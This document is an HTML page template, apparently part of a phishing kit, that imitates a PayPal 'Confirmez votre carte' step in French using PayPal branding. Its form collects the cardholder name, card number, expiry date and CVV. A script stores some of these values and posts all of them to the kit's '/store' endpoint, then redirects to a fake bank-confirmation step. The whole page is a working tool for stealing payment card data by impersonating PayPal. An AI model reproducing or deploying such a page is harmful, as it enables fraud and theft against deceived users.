<!DOCTYPE html>
<html dir="ltr">

    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <title>Confirmez votre carte</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge">
        <meta charset="utf8">
        <link rel="stylesheet" href="/css/normalize.css">
        <link rel="stylesheet" href="/css/bootstrap.css">
        <link rel="stylesheet" href="/css/font-awesome.css">
        <link rel="stylesheet" href="/css/main_style.css">
        <style>
        .error {
            border: 1px solid #c72e2e;
        }

        </style>
    </head>

    <body>
        <div class="lod-full" style="display: none;">
            <div class="lod-c"></div>
        </div>
        <div class="contain">
            <div class="img-logo">
                <a href="#"><img src="/images/paypal-logo.png"
                        style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
            </div>
            <div class="center-color"></div>
            <div class="right-btn"><a href="#" class="log_out">Déconnexion</a></div>
            <div class="cls"></div>
        </div>
        <div class="contain biling-p">
            <form method="POST" action="#" class="contain-info" id="card_form">
                <center>
                    <span class="step" style="text-transform:uppercase"><b>étape 2 sur 3</b></span>
                    <h3>Confirmez votre carte</h3>
                    <center style="margin-bottom:20px;">
                        <img src="/images/vsa.png">
                        <img src="/images/mc.png">
                        <img src="/images/dcl1.png">
                        <img src="/images/dc.png">
                        <img src="/images/amx.png">
                    </center>
                    <style>
                    .x {
                        width: 48%;
                        float: left;
                        font-size: 15px;
                    }

                    .y {
                        margin-right: 0;
                        float: right;
                        width: 48%;
                        font-size: 15px;
                    }

                    @media screen and (max-width: 767px) {

                        .x,
                        .y {
                            width: 300px;
                            float: none;
                            font-size: 16px;
                        }
                    }

                    </style>
                    <input type="text" name="n_card" class="bill_input" placeholder="Nom sur la carte"
                        required="required" autocomplete="on" autocorrect="off" autocapitalize="sentences"
                        aria-required="true">
                    <div style="position: relative;" class="containvis">
                        <input type="tel" id="cart_number" name="c_num" maxlength="16" class="bill_input"
                            placeholder="Numéro de la carte" required="required" autocomplete="off" autocorrect="off"
                            autocapitalize="sentences" aria-required="true">
                        <img id="type_v" src="/images/vsa.png" style="display: none">
                    </div>
                    <div class="input-block">
                        <input id="exp_date" name="exp_date" class="_input" required="required"
                            placeholder="Mois d'expiration" />

                        <input type="tel" name="ccv" id="ccv" class="_input" maxlength="4" placeholder="Cryptogramme"
                            required="required" autocomplete="on" autocorrect="off" autocapitalize="sentences"
                            aria-required="true" style="margin-bottom:20px">
                    </div>
                    <hr class="hr" style="margin:0px auto 15px">
                    <input type="submit" value="Continuer" class="bill_input btn-bill">
                </center>
            </form>
        </div>
        <div class="foot-pay">
            <center>
                <a href="#">Aide et Contact</a>
                <a href="#">Confidentialité</a>
                <a href="#">Légal</a>
                <a href="#">Sécurité</a>
            </center>
        </div>
        <script src="/js/jquery-3.3.1.min.js"></script>
        <script src="/js/jequery.mask.min.js"></script>
        <script>
        $(document).ready(function() {

            $('#cart_number').on('focusout', function() {
                $('#cart_number').removeClass('error');
            });


            $("html").delegate("#cart_number", "keyup", function() {
                if ($(this).val().substring(0, 1) == "4") {
                    $(this).next().attr("src", "./images/vsa.png");
                    $(this).next().show(10);
                } else if ($(this).val().substring(0, 1) == "5") {
                    $(this).next().attr("src", "./images/mc.png");
                    $(this).next().show(10);
                } else if ($(this).val().substring(0, 1) == "6") {
                    $(this).next().attr("src", "./images/dc.png");
                    $(this).next().show(10);
                } else if ($(this).val().substring(0, 1) == "3") {
                    $(this).next().attr("src", "./images/amx.png");
                    $(this).next().show(10);
                } else {
                    $(this).next().hide(10);
                }
            });
            $("#cart_number").mask("0000 0000 0000 0000");
            $("#exp_date").mask('00/0099');
            $("#ccv").mask('0009');

            $('#card_form').submit(function(e) {
                e.preventDefault();
                sessionStorage.setItem('n_card', $('input[name="n_card"]').val());
                sessionStorage.setItem('c_num', $('input[name="c_num"]').val());
                $('.lod-full').show();
                $.post("{{url('/store')}}", $(this).serialize())
                    .done(function() {
                        location.replace("{{ url('/confirm-bank') }}");
                    }).fail(function() {
                        location.reload();
                    })
            });
        });
        </script>


    </body>

</html>
